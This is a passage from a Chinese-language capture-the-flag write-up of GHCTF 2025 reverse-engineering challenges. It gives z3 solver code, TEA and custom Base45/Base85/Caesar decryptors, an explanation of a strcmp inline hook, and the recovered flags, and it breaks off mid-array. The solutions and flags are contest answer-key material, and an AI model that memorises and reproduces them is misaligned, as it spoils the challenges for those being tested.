class="number">0x7F</span>,<span class="number">0x46</span>,<span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0xB1</span>,<span class="number">0x03</span>,<span class="number">0x49</span>,<span class="number">0xA3</span>,<span class="number">0x27</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0xD1</span>,<span class="number">0x2C</span>,<span class="number">0x37</span>,<span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0xBD</span>,<span class="number">0x75</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span> + <span class="number">4</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>,EncFlag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-1"><a href="#Flag值-1" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125;</code></p><h2 id="FishingKit"><a href="#FishingKit" class="headerlink" title="FishingKit"></a>FishingKit</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>结合题目描述可以知道这题的考点是Hook。</p><p>首先程序要求输入bait数据，进行一个计算检验，这部分直接用z3就可以解出目标数据。</p><p><img src="/2025/03/06/GHCTF2025WP/9.png" alt="alt text"></p><p>z3代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a0,a1,a2,a3,a4,a5,a6,a7,a8,a9 = BitVecs(<span class="string">&quot;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&quot;</span>,<span class="number">12</span>) </span><br><span class="line"></span><br><span class="line">s.add(<span class="number">202</span> * a8 + <span class="number">216</span> * a5 - <span class="number">4</span> * a4 - <span class="number">330</span> * a9 - <span class="number">13</span> * a4 - <span class="number">268</span> * a6 == -<span class="number">14982</span>)</span><br><span class="line">s.add(<span class="number">325</span> * a8 + <span class="number">195</span> * a0 + <span class="number">229</span> * a1 - <span class="number">121</span> * a6 - <span class="number">409</span> * a6 - (a1 &lt;&lt; <span class="number">7</span>) == <span class="number">22606</span>)</span><br><span class="line">s.add(<span class="number">489</span> * a1 + <span class="number">480</span> * a6 + <span class="number">105</span> * a2 + <span class="number">367</span> * a3 - <span class="number">135</span> * a4 - <span class="number">482</span> * a9 == <span class="number">63236</span>)</span><br><span class="line">s.add(<span class="number">493</span> * a1 - <span class="number">80</span> * a4 - <span class="number">253</span> * a8 - <span class="number">121</span> * a2 - <span class="number">177</span> * a0 - <span class="number">243</span> * a9 == -<span class="number">39664</span>)</span><br><span class="line">s.add(<span class="number">275</span> * a4 + <span class="number">271</span> * a6 + <span class="number">473</span> * a7 - <span class="number">72</span> * a5 - <span class="number">260</span> * a4 - <span class="number">367</span> * a4 == <span class="number">14255</span>)</span><br><span class="line">s.add(<span class="number">286</span> * a0 + <span class="number">196</span> * a7 + <span class="number">483</span> * a2 + <span class="number">442</span> * a1 - <span class="number">495</span> * a8 - <span class="number">351</span> * a4 == <span class="number">41171</span>)</span><br><span class="line">s.add(<span class="number">212</span> * a2 + <span class="number">283</span> * a7 - <span class="number">329</span> * a8 - <span class="number">429</span> * a9 - <span class="number">362</span> * a2 - <span class="number">261</span> * a6 == -<span class="number">90284</span>)</span><br><span class="line">s.add(<span class="number">456</span> * a5 + <span class="number">244</span> * a7 + <span class="number">92</span> * a4 + <span class="number">348</span> * a7 - <span class="number">225</span> * a1 - <span class="number">31</span> * a2 == <span class="number">88447</span>)</span><br><span class="line">s.add(<span class="number">238</span> * a9 + <span class="number">278</span> * a7 + <span class="number">216</span> * a6 + <span class="number">237</span> * a0 + <span class="number">8</span> * a2 - <span class="number">17</span> * a9 == <span class="number">83838</span>)</span><br><span class="line">s.add(<span class="number">323</span> * a9 + <span class="number">121</span> * a1 + <span class="number">370</span> * a7 - (a4 &lt;&lt; <span class="number">6</span>) - <span class="number">196</span> * a9 - <span class="number">422</span> * a0 == <span class="number">26467</span>)</span><br><span class="line">s.add(<span class="number">166</span> * a9 + <span class="number">90</span> * a1 + <span class="number">499</span> * a2 + <span class="number">301</span> * a8 - <span class="number">31</span> * a2 - <span class="number">206</span> * a2 == <span class="number">88247</span>)</span><br><span class="line">s.add(<span class="number">355</span> * a0 + <span class="number">282</span> * a4 + <span class="number">44</span> * a9 + <span class="number">359</span> * a8 - <span class="number">167</span> * a5 - <span class="number">62</span> * a3 == <span class="number">76658</span>)</span><br><span class="line">s.add(<span class="number">488</span> * a6 + <span class="number">379</span> * a9 + <span class="number">318</span> * a2 - <span class="number">85</span> * a1 - <span class="number">357</span> * a2 - <span class="number">277</span> * a5 == <span class="number">35398</span>)</span><br><span class="line">s.add(<span class="number">40</span> * a0 + <span class="number">281</span> * a4 + <span class="number">217</span> * a5 - <span class="number">241</span> * a1 - <span class="number">407</span> * a7 - <span class="number">309</span> * a7 == -<span class="number">35436</span>)</span><br><span class="line">s.add(<span class="number">429</span> * a3 + <span class="number">441</span> * a3 + <span class="number">115</span> * a1 + <span class="number">96</span> * a8 + <span class="number">464</span> * a1 - <span class="number">133</span> * a7 == <span class="number">157448</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    ans = s.model() </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="string">f&quot;<span class="subst">&#123;ans[<span class="built_in">eval</span>(<span class="string">f&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;</span>)]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(t),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到<strong>DeluxeBait</strong>字串</p><p>然后下面部分有个加密函数，可以看出是魔改RC4，加密完与一个数组进行比对，这边解密后会得到假Flag，有兴趣的可以自己解密试试。</p><p><img src="/2025/03/06/GHCTF2025WP/10.png" alt="alt text"></p><p>由于知道是Hook考点，直接字符串搜索VirtualProtect，定位，查找交叉引用，发现有一个函数有调用。</p><p><img src="/2025/03/06/GHCTF2025WP/11.png" alt="alt text"></p><p>可以看出这部分就是Hook代码，上面的0xff,0x25就是far jmp的汇编，参数一传进来要Hook的函数，参数二是自己的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/12.png" alt="alt text"></p><p>在他的调用上层就可以看到获取了模块和函数地址，不过做了异或加密处理，sub_140001CE0就是Hook函数要跳转执行的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/13.png" alt="alt text"></p><p>可以解密出来是strcmp，也就是对strcmp做了Hook，之前在主函数有看到strcmp，就是那里程序发生了跳转，没有执行真实的strcmp。</p><p><img src="/2025/03/06/GHCTF2025WP/14.png" alt="alt text"></p><p>所以接下来重点分析sub_140001CE0函数。可以看到这边是对数据进行了24轮Tea加密，最后与byte_1400063C8数组进行比对，那么byte_1400063C8就是真实被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/15.png" alt="alt text"></p><p>这边重点就是传入的buf和buf_1数据实际是什么，可以在赋这两个数组赋值完后处进行断点，查看实际数据。</p><p>可以发现实际上就是DeluxeBait字串以及输入的Flag值。</p><p><img src="/2025/03/06/GHCTF2025WP/16.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/17.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/18.png" alt="alt text"></p><p>由于buf数组在开头已经memset 0了，赋值的字串”DeluxeBait”长度仅有10，而Tea加密要的Key必须是16字节，所以最终进行加密的Key是这个字串加上6个0x00。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x66778899</span>, sum = delta * <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> EncFlag[<span class="number">24</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(EncFlag, <span class="string">&quot;!V&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    EncFlag[<span class="number">2</span>] = <span class="number">-105</span>;</span><br><span class="line">    EncFlag[<span class="number">3</span>] = <span class="number">-90</span>;</span><br><span class="line">    EncFlag[<span class="number">4</span>] = <span class="number">26</span>;</span><br><span class="line">    EncFlag[<span class="number">5</span>] = <span class="number">-43</span>;</span><br><span class="line">    EncFlag[<span class="number">6</span>] = <span class="number">-60</span>;</span><br><span class="line">    EncFlag[<span class="number">7</span>] = <span class="number">-34</span>;</span><br><span class="line">    EncFlag[<span class="number">8</span>] = <span class="number">-92</span>;</span><br><span class="line">    EncFlag[<span class="number">9</span>] = <span class="number">-100</span>;</span><br><span class="line">    EncFlag[<span class="number">10</span>] = <span class="number">-126</span>;</span><br><span class="line">    EncFlag[<span class="number">11</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">12</span>] = <span class="number">-47</span>;</span><br><span class="line">    EncFlag[<span class="number">13</span>] = <span class="number">69</span>;</span><br><span class="line">    EncFlag[<span class="number">14</span>] = <span class="number">-56</span>;</span><br><span class="line">    EncFlag[<span class="number">15</span>] = <span class="number">86</span>;</span><br><span class="line">    EncFlag[<span class="number">16</span>] = <span class="number">-89</span>;</span><br><span class="line">    EncFlag[<span class="number">17</span>] = <span class="number">-76</span>;</span><br><span class="line">    EncFlag[<span class="number">18</span>] = <span class="number">-106</span>;</span><br><span class="line">    EncFlag[<span class="number">19</span>] = <span class="number">92</span>;</span><br><span class="line">    EncFlag[<span class="number">20</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">21</span>] = <span class="number">73</span>;</span><br><span class="line">    EncFlag[<span class="number">22</span>] = <span class="number">-121</span>;</span><br><span class="line">    EncFlag[<span class="number">23</span>] = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Key[] = <span class="string">&quot;DeluxeBait\0\0\0\0\0\0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">16</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.23s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-2"><a href="#Flag值-2" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Wh@t_@_b1g_F1sh&#125;</code></p><h2 id="Mio？Ryo？Soyo？"><a href="#Mio？Ryo？Soyo？" class="headerlink" title="Mio？Ryo？Soyo？"></a>Mio？Ryo？Soyo？</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>第二批题目的签到题，常规的Python程序解包。</p><p>使用pyinstxtractor进行解包，需要对应程序python版本，使用python3.8运行，否则无法解压pyz文件得到Secret.pyc。</p><p><img src="/2025/03/06/GHCTF2025WP/19.png" alt="alt text"></p><p>使用uncompyle6进行pyc反编译program.pyc可以看到源码。发现引入了Secret文件，可以在PYZ-00.pyz_extracted找到对应pyc文件，同样使用uncompyle6得到源码。</p><p><img src="/2025/03/06/GHCTF2025WP/20.png" alt="alt text"></p><p>发现引入了SecretEncrypt文件，并且这边有program.py里看到被调用比对的数据，大概率就是被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/21.png" alt="alt text"></p><p>反编译得到SecretEncrypt代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MMMMiiiiiio</span>:</span><br><span class="line">    MMiiiiiiooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(Miiooooooooo) <span class="keyword">for</span> Miiooooooooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">118</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">MMMMiiooooooo</span>(<span class="params">MMMMMMMMMiiiooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        MMMMiiiiioooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">        MMMMMMMiiiiioo = (<span class="number">4</span> - <span class="built_in">len</span>(MMMMMMMMMiiiooo) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">        MMMMMMMMMiiiooo += <span class="string">b&#x27;\x00&#x27;</span> * MMMMMMMiiiiioo</span><br><span class="line">        <span class="keyword">for</span> MMMMMMiiiiiio <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MMMMMMMMMiiiooo), <span class="number">4</span>):</span><br><span class="line">            MMMMiiiiiiooooo = MMMMMMMMMiiiooo[MMMMMMiiiiiio[:MMMMMMiiiiiio + <span class="number">4</span>]]</span><br><span class="line">            MMMMMMiiioooooo = <span class="built_in">int</span>.from_bytes(MMMMiiiiiiooooo, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">            MMMMMMMiiooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                MMMMMMMiiooooooooo = MMMMiiiiiio.MMiiiiiiooo[MMMMMMiiioooooo % <span class="number">85</span>] + MMMMMMMiiooooooooo</span><br><span class="line">                MMMMMMiiioooooo //= <span class="number">85</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                MMMMiiiiioooooooooo += MMMMMMMiiooooooooo</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> MMMMMMMiiiiioo:</span><br><span class="line">                MMMMiiiiioooooooooo = MMMMiiiiioooooooooo[<span class="literal">None</span>[:-MMMMMMMiiiiioo]]</span><br><span class="line">            <span class="keyword">return</span> MMMMiiiiioooooooooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RRRRyyooo</span>:</span><br><span class="line">    RRRRyooooooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(RRRRRRRyyyyyoooo) <span class="keyword">for</span> RRRRRRRyyyyyoooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RRRRRRRyyyyooooo</span>(<span class="params">RRRRRRyyyoooooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        RRRRyyyyyooo = []</span><br><span class="line">        RRyyyyyyyyyoooooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> RRyyyyyyyyyoooooo &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">            <span class="keyword">if</span> RRyyyyyyyyyoooooo + <span class="number">1</span> &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo] &lt;&lt; <span class="number">8</span> | RRRRRRyyyoooooo[RRyyyyyyyyyoooooo + <span class="number">1</span>]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(RRRRyyyyyooo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SSSooooyyooo</span>(<span class="params">SSSSooyoooooo, SSSSSoyyooooo</span>):</span><br><span class="line">    SSoooooyyyyyyoo = []</span><br><span class="line">    <span class="keyword">for</span> SSSSSSSSSoyooo <span class="keyword">in</span> SSSSooyoooooo:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSSoyyooooo) % <span class="number">26</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;0&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) - SSSSSoyyooooo) % <span class="number">10</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            SSoooooyyyyyyoo.append(SSSSSSSSSoyooo)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(SSoooooyyyyyyoo)</span><br></pre></td></tr></table></figure><p>可以看出第一个是标准Base85加密，第二个是Base45加密，但是和标准的表不一样，第三个是经典的凯撒加密。</p><p>这部分就是Base45实际用到的表。</p><p><code>TABLE = &quot;&quot;.join([chr(i) for i in range(48, 93)])</code></p><p>编写三个加密的解密函数，按Secret文件的代码对Enc数据进行按顺序调用解密即可得到Flag。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - shift) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base85_decode</span>(<span class="params">encoded_text</span>):</span><br><span class="line">    byte_data = encoded_text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded = base64.a85decode(byte_data)</span><br><span class="line">    <span class="keyword">return</span> decoded.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base45_decode_custom</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    decoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line">    char_to_val = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(chars)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">2</span>]] * <span class="number">45</span> * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num &gt;&gt; <span class="number">8</span>)</span><br><span class="line">            decoded.append(num &amp; <span class="number">0xFF</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num)</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> decoded.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    enc = <span class="built_in">bytes</span>([<span class="number">57</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">114</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">34</span>, <span class="number">109</span>, 